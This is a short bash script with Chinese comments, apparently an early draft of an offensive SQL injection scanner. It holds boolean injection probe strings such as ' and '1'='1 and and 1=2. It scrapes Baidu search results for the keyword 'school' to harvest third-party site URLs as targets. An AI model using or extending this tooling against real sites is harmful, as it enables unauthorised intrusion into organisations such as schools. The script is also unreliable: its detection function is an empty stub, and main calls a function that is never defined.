#!/bin/bash

#sql注入检测参数
sql_com1="%27"											#	"'"		#异常
sql_com2="%27%20and%20%271%27=%271"						#   "' and '1'='1"			#正常
sql_com3="%27%20and%20%271%27=%272"						#	"' and '1'='2"			#异常
sql_com4="%20and%201=1"									#	" and 1=1"			#正常
sql_com5="%20and%201=2"									#	" and 1=2"			#异常

search_wd="学校"						#"inurl:\".php?id=\""
sql_www=""
dist_url=""

#从一个网站搜索注入点
get_site()
{
	html_site=`curl "$sql_www"`
}

#从百度搜索获取关键字的搜索结果网址，http
baidu_search()
{
	curl -k -s http://www.baidu.com/s?wd="$search_wd" > temp.txt
	sed -i "s/<[^>]*>//g" temp.txt		#去掉html标记
	sed -i "/^$/d" temp.txt		#去掉空行
	grep -o -E "http://www.baidu.com/link?[^\"]*" temp.txt > temp_1.txt		#获取百度link链接地址
	>url.txt
	while read oneline
	do
		#将http转换为https
		url_2=`echo $oneline | sed "s/http/https/g" `
		#用百度https地址解析出真实地址
		url_3=`curl -k -i -s $url_2 | grep "Location" | awk '{print $2}'`
		#打印网址和服务器类型
		echo $url_3 >> url.txt
	done < temp_1.txt
}

#sql注入点检测，使用百度
http_tool_url()
{
	echo "-------------"
}

main()
{
	baidu_search
	http_tool_baidu
}

main


